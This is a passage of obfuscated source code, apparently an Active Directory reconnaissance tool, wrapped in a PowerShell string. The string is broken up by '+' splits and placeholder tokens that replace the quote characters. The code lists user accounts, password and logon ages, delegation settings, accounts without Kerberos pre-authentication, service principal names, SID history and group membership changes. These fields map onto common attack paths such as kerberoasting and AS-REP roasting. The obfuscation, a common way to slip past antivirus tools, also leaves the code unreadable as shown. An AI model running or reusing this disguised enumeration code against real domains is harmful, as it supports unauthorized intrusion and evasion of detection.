                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
 '+'                   if (Convert.ToString(AdUser.Members[lEzjpwdLastSetlEzj].Value) == lEzj0lEzj)
                    {
                        if ((bool) AdUser.Members[lEzjPasswordNeverExpireslEzj].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members[lEzjPasswordLastSetlEzj].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members[lEzjpwdLastSetlEzj].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members[lEzjPasswordLastSetlEzj].Value);
                        DaysSinceL'+'astPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members[lEzjaccountExpireslEzj].Value != (Int64) 9223372036854775807)
               '+'     //{
                        //if ((Int64) AdUser.Members[lEzjaccountExpireslEzj].Value != (Int64) 0)
                        if (AdUser.Members[lEzjAccountExpirationDatelEzj].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members[lEzjaccountExpireslEzj].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members[lEzjAccountExpirationDatelEzj].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members[lEzjSIDHistorylEzj].Value;
                    string sids = lEzjlEzj;
                    foreach (var value in history)
                    {
                        sids = sids + lEzj,lEzj + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(xfJ4,xfJ4);
                    if (AdUser.Members[lEzjmsDS-SupportedEncryptionTypeslEzj].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members[lEzjmsDS-SupportedEncryptionTypeslEzj].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if (AdUser.Members[lEzjUserAccountControllEzj].Value != null)
                    {
                        AccountNotDelegated = !((bool) AdUser.Members[lEzjAccountNotDelegatedlEzj].Value);
                        if ((bool) AdUser.Members[lEzjTrustedForDelegationlEzj].Value)
                        {
                            DelegationType = lEzjUnconstrainedlEzj;
                            DelegationServices = lEzjAnylEzj;
                        }
                        if (AdUser.Members[lEzjmsDS-AllowedToDelegateTolEzj] != null)
                        {
                            Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members[lEzjmsDS-AllowedToDelegateTolEzj].Value;
                            if (delegateto.Value != null)
                            {
                                DelegationType = lEzjConstrainedlEzj;
                                foreach (var value in delegateto)
                                {
                                    DelegationServices = DelegationServices + lEzj,lEzj + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(xfJ4,xfJ4);
                            }
                        }
                        if ((bool) AdUser.Members[lEzjTrustedToAuthForDelegationlEzj].Value == true)
                        {
                            DelegationProtocol = lEzjAnylEzj;
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = lEzjKerberoslEzj;
                        }
                    }

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members[lEzjservicePrincipalNamelEzj].Value;
                    if (SPNs.Value == null)
                    {
                        HasSPN = false;
                    }
                    else
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                  '+'  UserObj.Members.Add(new PSNoteProperty(lEzjUserNamelEzj, CleanString(AdUser.Members[lEzjSamAccountNamelEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(AdUser.Members['+'lEzjNamelEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjEnabledlEzj, Enabled));
                    UserObj.Members.Add(new PSNoteProperty(lEzjMust Change Password at LogonlEzj, MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCannot Change PasswordlEzj, AdUser.Members[lEzjCannotChangePasswordlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Never ExpireslEzj, AdUser.Members[lEzjPasswordNeverExpireslEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjReversible Password EncryptionlEzj, AdUser.Members[lEzjAllowReversiblePasswordEncryptionlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjSmartcard Logon RequiredlEzj, AdUser.Members[lEzjSmartcardLogonRequiredlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDelegation PermittedlEzj, AccountNotDelegated));
                    UserObj.Members.Add(new PSNoteProperty(lEzjKerberos DES OnlylEzj, AdUser.Members[lEzjUseDESKeyOnlylEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjKerberos RC4lEzj, KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty(lEzjKerberos AES-128bitlEzj, KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty(lEzjKerberos AES-256bitlEzj, KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDoes Not Require Pre AuthlEzj, AdUser.Members[lEzjDoesNotRequirePreAuthlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjNever Logged inlEzj, NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLogon Age (days)lEzj, DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Age (days)lEzj, DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDormant (> lEzj + DormantTimeSpan + lEzj days)lEzj, Dormant));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Age (> lEzj + PassMaxAge + lEzj days)lEzj, PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAccount Locked OutlEzj, AdUser.Members[lEzjLockedOutlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword ExpiredlEzj, AdUser.Members[lEzjPasswordExpiredlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Not RequiredlEzj, AdUser.Members[lEzjPasswordNotRequiredlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDelegation TypelEzj, DelegationType));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDelegation ProtocollEzj, DelegationProtocol));
                    UserObj.'+'Members.Add(new PSNoteProperty(lEzjDelegation ServiceslEzj, DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLogon WorkstationslEzj, AdUser.Members[lEzjLogonWorkstationslEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAdminCountlEzj, AdUser.Members[lEzjAdminCountlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPrimary GroupIDlEzj, AdUser.Members[lEzjprimaryGroupIDlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjSIDlEzj, AdUser.Members[lEzjSIDlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjSIDHistorylEzj, SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty(lEzjHasSPNlEzj, HasSPN));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, CleanString(AdUser.Members[lEzjDescriptionlEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjTitlelEzj, CleanString(AdUser.Members[lEzjTitlelEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDepartmentlEzj, CleanString(AdUser.Members[lEzjDepartmentlEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCompanylEzj, CleanString(AdUser.Members[lEzjCompanylEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjManagerlEzj, CleanString(AdUser.Members[lEzjManagerlEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjInfolEzj, CleanString(AdUser.Members[lEzjInfolEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLast Logon DatelEzj, LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword LastSetlEzj, PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAccount Expiration DatelEzj, AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAccount Expiration (days)lEzj, AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty(lEzjMobilelEzj, CleanString(AdUser.Members[lEzjMobilelEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjEmaillEzj, CleanString(AdUser.Members[lEzjmaillEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty('+'lEzjHomeDirectorylEzj, AdUser.Members[lEzjhomeDirectorylEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjProfilePathlEzj, AdUser.Members[lEzjprofilePathlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjScriptPathlEzj, AdUser.Members[lEzjScriptPathlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjUserAccountControllEzj, AdUser.Members[lEzjUserAccountControllEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjFirst NamelEzj, CleanString(AdUser.Members[lEzjgivenNamelEzj].Value)));
         '+'           UserObj.Members.Add(new PSNoteProperty(lEzjMiddle NamelEzj, CleanString(AdUser.Members[lEzjmiddleNamelEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLast NamelEzj, CleanString(AdUser.Members[lEzjsnlEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCountrylEzj, CleanString(AdUser.Members[lEzjclEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdUser.Members[lEzjwhenCreatedlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdUser.Members[lEzjwhenChangedlEzj].Value));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, CleanString(AdUser.Members[lEzjDistinguishedNamelEzj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCanonicalNamelEzj, CleanString(AdUser.Members[lEzjCanonicalNamelEzj].Value)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members[lEzjservicePrincipalNamelEzj].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members[lEzjuserAccountControllEzj].Value != null)
                    {
                     '+'   var userFlags = (UACFlags) AdUser.Members[lEzjuserAccountControllEzj].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members[lEzjpwdLastSetlEzj].Value) != lEzj0lEzj)
                    {
                        '+'PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members[lEzjpwdLastSetlEzj].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members[lEzjmemberoflEzj].Value;
                    if (MemberOfAttribute.Value != null)
                    {
                        foreach (string Member in MemberOfAttribute)
                        {
                            Memberof = Memberof + lEzj,lEzj + ((Convert.ToString(Member)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        }
                        Memberof = Memberof.TrimStart(xfJ4,xfJ4);
                    }
                    string Description = CleanString(AdUser.Members[lEzjDescr'+'iptionlEzj].Value);
                    string PrimaryGroupID = Convert.ToString(AdUser.Members[lEzjprimaryGroupIDlEzj].Value);
                    foreach (string SPN in SPNs)
                    {
                        string[] SPNArray = SPN.Split(xfJ4/xfJ4);
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjUsernamelEzj, CleanString(AdUser.Members[lEzjSamAccountNamelEzj].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(AdUser.Members[lEzjNamelEzj].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjEnabledlEzj, Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjServicelEzj, SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjHostlEzj, SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjPassword Last SetlEzj, PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, Description));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjPrimary GroupIDlEzj, PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjMemberoflEzj, Memberof));
                        SPNLi'+'st.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members[lEzjmanagedBylEzj].Value);
                    string ManagedBy = lEzjlEzj;
                    string SIDHistory = lEzjlEzj;

                    if (AdGroup.Members[lEzjmanagedBy'+'lEzj].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { lEzjCN=lEzj },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { lEzjOU=lEzj },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(xfJ4,xfJ4);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members[lEzjSIDHistorylEzj].Value;
                    string sids = '+'lEzjlEzj;
                    foreach (var value in history)
                    {
                        sids = sids + lEzj,lEzj + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(xfJ4,xfJ4);

                    PSObject GroupObj = new PSOb'+'ject();
                    GroupObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdGroup.Members[lEzjSamAccountNamelEzj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjAdminCountlEzj, AdGroup.Members[lEzjAdminCountlEzj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjGroupCategorylEzj, AdGroup.Members[lEzjGroupCategorylEzj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjGroupScopelEzj, AdGroup.Members[lEzjGroupScopelEzj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjManagedBylEzj, ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjSIDlEzj, AdGroup.Members[lEzjsidlEzj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjSIDHistorylEzj, SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, CleanString(AdGroup.Members[lEzjDescriptionlEzj].Value)));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdGroup.Members[lEzjwhenCreatedlEzj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdGroup.Members[lEzjwhenChangedlEzj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, CleanString(AdGroup.Members[lEzjDistinguishedNamelEzj].Value)));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjCanonicalNamelEzj, AdGroup.Members[lEzjCanonicalNamelEzj].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection ReplValueMetaData = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members[lEzjmsDS-ReplValueMetaDatalEzj].Value;

                    if (ReplValueMetaData.Value != null)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace(lEzjcnIx00lEzj, lEzjlEzj).Replace(lEzj&lEzj,lEzj&amp;lEzj));

                            if (ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeDeletedlEzj].InnerText != lEzj1601-01-01T00:00:00ZlEzj)
                            {
            '+'                    Action = lEzjRemovedlEzj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeCreatedlEzj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeDeletedlEzj].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = lEzjAddedlEzj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeCreatedlEzj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, AdGroup.Members[lEzjSamAccountNamelEzj].Value));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjGroup DistinguishedNamelEzj, CleanString(AdGroup.Members[lEzjDistinguishedNamelEzj].Value)));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjMember DistinguishedNamelEzj, CleanString(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjpszObjectDnlEzj].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjActionlEzj, Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjAdded Age (Days)lEzj, DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjRemoved Age (Days)lEzj, DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjAdded DatelEzj, AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjRemoved DatelEzj, RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjftimeCreatedlEzj, ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeCreatedlEzj].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjftimeDeletedlEzj, ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeDeletedlEzj].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties[lEzjSIDlEzj].Value)), (Convert.ToString(AdGroup.Members[lEzjSamAccountNamelEzj].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/Bloo'+'dHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members[lEzjsamaccounttypelEzj].Value);
                    string ObjectClass = Convert.ToString(AdGroup.Members[lEzjObjectClasslEzj].Value);
                    string AccountType = lEzjlEzj;
                    string GroupName = lEzjlEzj;
                    string MemberUserName = lEzj-lEzj;
                    string MemberName = lEzjlEzj;
                    string PrimaryGroupID = lEzjlEzj;
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == lEzjforeignSecurityPrincipallEzj)
                    {
                        AccountType = lEzjforeignSecurityPrincipallEzj;
                        MemberUserName = ((Convert.ToString(AdGroup.Members[lEzjDistinguishedNamelEzj].Value)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        MemberName = null;
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members[lEzjmemberoflEzj].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = lEzjgrouplEzj;
                        MemberName = ((Convert.ToString(AdGroup.Members[lEzjDistinguishedNamelEzj].Value)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members[lEzjmemberoflEzj].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountT'+'ype))
                    {
                        AccountType = lEzjuserlEzj;
                     '+'   MemberName = ((Convert.ToString(AdGroup.Members[lEzjDistinguishedNamelEzj].Value)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        MemberUserName = Convert.ToString(AdGroup.Members[lEzjsAMAccountNamelEzj].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members[lEzjprimaryGroupIDlEzj].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + lEzj-lEzj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                        GroupMe'+'mberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members[lEzjmemberoflEzj].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = lEzjcomputerlEzj;
                        MemberName = ((Convert.ToString(AdGroup.Members[lEzjDistinguishedNamelEzj].Value)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        MemberUserName = Convert.ToString(AdGroup.Members[lEzjsAMAccountNamelEzj].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members[lEzjprimaryGroupIDlEzj].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + lEzj-lEzj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueC'+'ollection)AdGroup.Members[lEzjmemberoflEzj].Value;
                        if (MemberG'+'roups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                                GroupMemberObj.Members.Add(new P'+'SNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = lEzjtrustlEzj;
                        MemberName = ((Convert.ToString(AdGroup.Members[lEzjDistinguishedNamelEzj].Value)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        MemberUserName = Convert.ToString(AdGroup.Members[lEzjsAMAccountNamelEzj].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members[lEzjprimaryGroupIDlEzj].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + lEzj-lEzj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
